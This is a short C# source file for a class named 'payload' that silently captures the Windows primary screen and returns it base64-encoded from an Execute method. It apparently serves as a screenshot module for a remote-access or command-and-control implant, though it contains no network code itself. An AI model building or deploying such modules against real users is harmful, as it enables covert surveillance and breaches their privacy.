using System;
using System.IO;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

public class payload
{
    public payload() { }

    private byte[] fnTakeScreenshotIfWindows()
    {
        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        {
            return Encoding.UTF8.GetBytes("ERROR://Not windows");
        }

        try
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;

            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    return ms.ToArray();
                }
            }
        }
        catch (Exception e)
        {
            return Encoding.UTF8.GetBytes("ERROR: Failed to take screenshot. Reason: " + e.Message);
        }
    }

    public string Execute(object param)
    {
        return Convert.ToBase64String(fnTakeScreenshotIfWindows());
    }
}